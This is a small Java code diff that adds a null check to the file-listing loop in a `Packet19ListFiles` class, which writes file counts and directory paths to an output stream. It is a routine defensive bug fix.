@@ -20,7 +20,7 @@ public class Packet19ListFiles extends AbstractOutgoingPacket {
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		dos.writeInt(files == null ? 0 : files.length);
 		
-		for (int i = 0; i < files.length; i++) {
+		for (int i = 0; i < (files == null ? 0 : files.length); i++) {
 			File file = files[i];
 			if (file.isDirectory()) {
 				sw.writeLine(file.getAbsolutePath());
